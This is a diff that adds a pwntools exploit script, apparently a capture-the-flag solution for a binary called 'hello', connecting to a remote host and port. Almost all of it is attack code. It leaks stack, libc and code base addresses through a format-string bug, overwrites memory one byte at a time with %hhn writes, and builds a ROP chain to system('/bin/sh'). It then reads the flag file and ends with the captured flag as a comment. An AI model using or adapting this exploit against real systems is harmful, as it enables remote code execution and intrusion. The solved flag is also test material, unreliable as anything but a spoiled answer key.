@@ -1,0 +1,82 @@
+from pwn import *
+
+e = ELF("./hello_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+script = '''
+b *vuln + 230
+'''
+
+def _1_byte_overwrite(address, value):
+    payload = p64(printf_ret_addr) + p64(address)
+    p.sendlineafter(b"to us: ", payload)
+    
+    if(value > 0):
+        payload = f"%{value}c%9$hhn.".encode()
+    else:
+        payload = f"%9$hhn.".encode()
+    p.sendlineafter(b"input: ", payload)
+    
+    payload = b"%85c%8$hhn."
+    p.sendlineafter(b"input: ", payload)
+
+p = remote("15.235.162.115", 6669)
+#p = process("./hello_patched")
+#p = gdb.debug("./hello_patched", gdbscript = script)
+
+# leak stack && libc base
+p.sendlineafter(b"name: ", b"%p\n")
+p.recvuntil(b"Hello, ")
+rsp = int(p.recvline(), 16) + 0x2120
+
+p.sendlineafter(b"friend? (y/n): ", b"y")
+p.sendafter(b"friend's name? ", b"%3$p")
+p.recvuntil(b"Hello, ")
+libc_base = int(p.recvline(), 16) - 0x114887
+
+print(hex(rsp))
+print(hex(libc_base))
+
+# stack pointer
+printf_ret_addr = rsp - 0x50 - 0x8
+payload = p64(printf_ret_addr)
+p.sendlineafter(b"to us: ", payload)
+'''
+payload = b"A" * 8 + b"hhn"
+p.sendlineafter(b"input: ", payload)
+'''
+# leak code base
+payload = b"%85p%8$hhn."
+p.sendlineafter(b"input: ", payload)
+code_base = int(p.recvuntil(b".")[-15:-1:], 16) - 0x22bd
+print(hex(code_base))
+
+
+ctr_addr = code_base + e.symbols['ctr']
+_1_byte_overwrite(ctr_addr + 3, 0xf0) # ctr -> negative
+
+# loop from here
+system = libc_base + libc.symbols['system']
+pop_rdi = libc_base + 0x000000000002a3e5
+ret = pop_rdi + 1
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+# perform rop
+ret_vuln = rsp - 0x8
+rop = [pop_rdi, binsh, ret, system]
+for i in range(4):
+    e = rop[i]
+    for j in range(8):
+        _1_byte_overwrite(ret_vuln + 8 * i + j, e & 0xff)
+        e = e >> 8
+
+# ctr -> poisitive -> loop end -> trigger rop
+payload = p64(printf_ret_addr) + p64(ctr_addr + 3)
+p.sendlineafter(b"to us: ", payload)
+payload = f"%9$hhn.".encode()
+p.sendlineafter(b"input: ", payload)
+
+p.sendline(b"cat /flag/flag.txt")
+
+p.interactive()
+#BKSEC{FOrm4t_Str1ng_2_FS0P_2_Buff3r_0verf10w}
